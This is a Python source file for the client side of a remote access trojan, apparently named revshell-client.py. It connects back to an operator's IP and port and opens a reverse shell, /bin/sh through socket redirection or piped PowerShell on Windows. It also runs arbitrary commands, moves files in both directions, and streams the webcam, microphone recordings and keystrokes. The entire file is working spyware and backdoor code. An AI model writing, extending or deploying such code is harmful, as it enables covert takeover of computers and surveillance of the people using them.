from client import Client
from transfer import FileTransfer
import os
import sys
import subprocess
import platform
import threading
import pty
import re

# Supposed to be a stable bash shell, works
# on the client but not on the server

def s2p(s, p):
    while True:
    	p.stdin.write(s.recv(1024).decode())
    	p.stdin.flush()

def p2s(s, p):
    while True:
    	s.send(p.stdout.read(1).encode())

def windows_shell(s):

	p=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
		stdin=subprocess.PIPE, shell=True, text=True)

	threading.Thread(target=s2p, args=[s,p], daemon=True).start()

	threading.Thread(target=p2s, args=[s,p], daemon=True).start()

	try:
		p.wait()
	except:
		s.close()
	sys.exit(0)

def spawn_shell(s):
	stdin = os.dup(0)
	stdout = os.dup(1)
	stderr = os.dup(2)
	
	if platform.system() == 'Linux' or platform.system() == 'Darwin':
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		subprocess.run(["/bin/sh","-i"])
		os.dup2(stdin, 0)
		os.dup2(stdout, 1)
		os.dup2(stderr, 2)
		os.close(stdin)
		os.close(stdout)
		os.close(stderr)
	elif platform.system() == 'Windows':
		windows_shell(s)
	else:
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		subprocess.run(["/bin/sh","-i"])
		os.dup2(stdin, 0)
		os.dup2(stdout, 1)
		os.dup2(stderr, 2)
		os.close(stdin)
		os.close(stdout)
		os.close(stderr)

def parse_command(command):
	if not command:
		return None, None

	command = re.split(' |\r|\t', command)
	cmd = command[0]
	args = command[1:]
	return cmd, args

def main():
	try:
		port = int(sys.argv[2])
	except ValueError:
		print("The given port is not a number.\n"
			"Usage: python3 revshell-client.py <ip> <port>")
		exit(1)
	client = Client(sys.argv[1], port)
	s = client.get_client_socket()
	while True:
		cmd, args = parse_command(client.recv())
		if not cmd or cmd == "exit":
			break
		if cmd == "cd":
			try:
				os.chdir(args[0])
			except Exception as e:
				output = str(e)
			else:
				output = ""
			client.send(output.strip())
		elif cmd == "webcam":
			from webcam import VideoStream
			stream = VideoStream(client)
			stream.send()
		elif cmd == "download":
			if len(args) != 2:
				continue
			file = args[0]
			transfer = FileTransfer(client)
			transfer.send(file)
		elif cmd == "upload":
			if len(args) != 2:
				continue
			path = args[1]
			transfer = FileTransfer(client)
			transfer.receive(path)
		elif cmd == "shell":
			spawn_shell(s)
		elif cmd == "record":
			from recorder import Recorder
			recorder = Recorder(client)
			recorder.record()
		elif cmd == "keylog":
			from keylogger import Keylogger
			keylogger = Keylogger(client)
			keylogger.record()
		else:
			output = subprocess.getoutput(cmd + " " + ' '.join(args))
			client.send(output)
	s.close()


if __name__ == '__main__':
	if len(sys.argv) != 3:
		print("Usage: python3 revshell-client.py <ip> <port>")
		exit(1)
	main()